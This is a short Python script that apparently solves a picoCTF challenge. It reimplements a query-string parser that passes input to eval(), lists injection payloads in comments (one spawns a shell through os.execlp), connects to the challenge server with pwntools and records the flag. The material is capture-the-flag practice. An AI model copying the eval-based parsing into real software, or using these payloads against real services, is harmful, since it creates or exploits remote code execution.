#!/usr/bin/env python

from pwn import *
from os import path

def mk_query_dict(url):
	query = None
	temp = url.rsplit('?', 1)
	if len(temp) == 1:
		# No query string!
		query = {}
	else:
		temp = temp[1].rsplit('#', 1)[0] # Split away fragment id
		temp = temp.replace('=', '":"').replace('&', '","') # Turn into python dictonary syntax
		log.info('Temp: ' + temp)
		query = eval('{"' + temp + '"}')
		log.info('Query: ' + str(query))

		# Un-percent encode query items
		for k in query:
			temp = query[k].split('%')
			for i in range(1, len(temp)):
				temp[i] = eval('"\\x' + temp[i][:2] + '"') + temp[i][2:]
			query[k] = ''.join(temp)
	
	return query

# ?hi=test","or=bad
# ?hi=",path.sys.stdout.write('AAAA'):"
# ?hi=",path.os.execlp('sh','sh'):"

explore = False

def main():
	if explore:
		while True:
			usr = raw_input('>>> ').strip()
			print mk_query_dict(usr)
	else:
		while True:
			r = remote('python.picoctf.com', 6364)
			usr = raw_input('>>> ').strip()
			r.sendline(usr)
			r.interactive()
			r.close()

main()

# final payload:
# GET /?hi=",path.os.execlp('sh','sh'):"
# flag: kids_dont_code_like_this_at_home